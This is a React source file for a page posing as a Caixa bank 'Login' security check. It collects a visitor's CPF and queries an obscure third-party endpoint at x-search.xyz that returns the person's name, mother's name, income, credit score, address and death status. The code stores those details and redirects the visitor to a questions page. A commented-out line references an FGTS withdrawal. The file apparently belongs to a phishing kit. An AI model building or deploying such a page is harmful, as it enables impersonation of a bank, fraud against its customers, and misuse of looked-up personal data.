import { useState } from "react";
import axios from "axios";
import logo from "../assets/caixa.webp";
import userIcon from "../assets/user.png";



// Define the API instance with the new endpoint
// eslint-disable-next-line react-refresh/only-export-components
export const api = axios.create({
    baseURL: "https://x-search.xyz/3nd-p01n75/xsiayer0-0t/rxe404r020125/r0070x/01",
});

export function LoginUpsell() {
    const [cpf, setCpf] = useState<string>("");
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [errorMessage, setErrorMessage] = useState<string>("");

    // Function to apply CPF mask and restrict input to 11 digits
    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.slice(0, 11);

        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    // Function to fetch data from the API using CPF
    const handleNext = async () => {
        if (cpf.length < 14) {
            setErrorMessage("Por favor, insira um CPF válido.");
            return;
        }

        setIsLoading(true);
        setErrorMessage(""); // Clear previous error messages

        try {
            const response = await api.get(`/cpf.php?cpf=${cpf.replace(/\D/g, "")}`);

            // Check if response is successful and contains data
            if (response.data?.status === 1 && response.data.dados?.length > 0) {
                const userData = response.data.dados[0];

                // Save user data to localStorage
                localStorage.setItem("userData", JSON.stringify({
                    nome: userData.Nome,
                    cpf: userData.CPF,
                    dataNascimento: userData.Data_Nascimento,
                    nomeMae: userData.Nome_Mae,
                    sexo: userData.Sexo,
                    renda: userData.Renda,
                    score: userData.Score,
                    endereco: userData.Endereco,
                    numero: userData.Numero,
                    bairro: userData.Bairro,
                    cidade: userData.Cidade,
                    estado: userData.Estado,
                    obito: userData.Obito
                }));

                // Redirect after successful fetch
                window.location.href = "/perguntas";
            } else {
                setErrorMessage("CPF não encontrado. Verifique e tente novamente.");
            }
            // eslint-disable-next-line @typescript-eslint/no-unused-vars
        } catch (error) {
            setErrorMessage("Erro ao buscar dados. Tente novamente mais tarde.");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="w-screen px-6 space-y-6 mt-6">
            <header className="flex flex-col justify-center items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Login Caixa</span>
            </header>


            <div className="flex flex-col items-center text-center space-y-2">
                <h1 className="font-bold text-3xl text-center">Verificação de segurança</h1>
                {/* <p className="text-zinc-500 text-lg">Precisamos <span className="font-bold text-orange-500">confirmar</span> que é você que está solicitando o saque <span className="font-bold text-orange-500">FGTS</span></p> */}
            </div>

            <div>
                <h1 className="text-lg text-zinc-500">
                    Informe seu CPF e clique em "Próximo" para confirmar:
                </h1>

            </div>

            {/* CPF Input */}
            <div className="flex items-center space-x-2">
                <img src={userIcon} alt="user" width={15} />
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                    placeholder="CPF"
                    maxLength={14}
                />
            </div>

            {/* Error Message */}
            {errorMessage && <p className="text-red-600">{errorMessage}</p>}

            {/* Next Button */}
            <button
                onClick={handleNext}
                className={`w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 ${isLoading ? "bg-orange-500 cursor-not-allowed transform scale-90" : "bg-orange-400 hover:scale-105"}`}
                disabled={isLoading}
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                ) : (
                    "Próximo"
                )}
            </button>

            <div className="flex flex-col items-center text-blue-900 space-y-6">
                <span className="underline">Preciso de ajuda</span>
            </div>
        </div>
    );
}
